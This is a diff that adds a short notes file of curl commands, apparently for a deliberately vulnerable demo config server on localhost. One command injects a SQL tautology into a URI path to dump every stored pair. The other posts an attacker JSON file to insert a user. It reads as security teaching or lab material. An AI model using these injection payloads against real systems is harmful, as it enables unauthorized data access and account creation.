@@ -1,0 +1,5 @@
+-> Injecting SQL in the URI string to get all pairs from the database using a GET request:
+curl -k -X GET https://localhost:8080/config/pairs/unsafe/SOF-LON%27%20OR%20%27%27=%27 -H "Content-Type: application/json" -H "Authorization: Basic YWRtaW46cGFzc3dvcmQ="
+
+-> Injecting SQL in the JSON body of a POST request (to bypass field restrictions):
+curl -k -X POST https://localhost:8080/config/users/safe -H "Content-Type: application/json" -H "Authorization: Basic YWRtaW46cGFzc3dvcmQ="   -d @/config-server/requests/attacker-insert-user-request.json
